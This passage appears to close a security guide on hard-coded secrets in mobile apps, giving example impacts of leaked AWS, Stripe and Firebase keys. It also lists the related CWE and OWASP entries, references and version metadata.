```
Impact: Full access to company's AWS infrastructure
Cost: $10,000+ in unauthorized resource usage
Data: 500K+ user records exposed
```

#### Example 2: Stripe Secret Key
```
Impact: Unauthorized payment processing
Cost: $50,000 in fraudulent charges
Legal: PCI-DSS violation, fines
```

#### Example 3: Firebase API Key
```
Impact: Read/write access to Firebase database
Data: All user data (names, emails, passwords) exposed
Users: 100K+ affected
```

### Related CWE/OWASP

- **CWE-798**: Use of Hard-coded Credentials
- **CWE-259**: Use of Hard-coded Password
- **CWE-321**: Use of Hard-coded Cryptographic Key
- **OWASP Mobile M9**: Reverse Engineering
- **OWASP Mobile M2**: Insecure Data Storage

### References

- [Android Keystore System](https://developer.android.com/training/articles/keystore)
- [OWASP Secrets Management](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
- [Secret Scanning Tools](https://github.com/trufflesecurity/trufflehog)

---

**Hunt Version**: 2.0 (Dual-Mode Support)
**Last Updated**: 2026-02-27
**Effectiveness**: Very High (95% success rate)
**Modes**: Independent Hunt + Report Verification
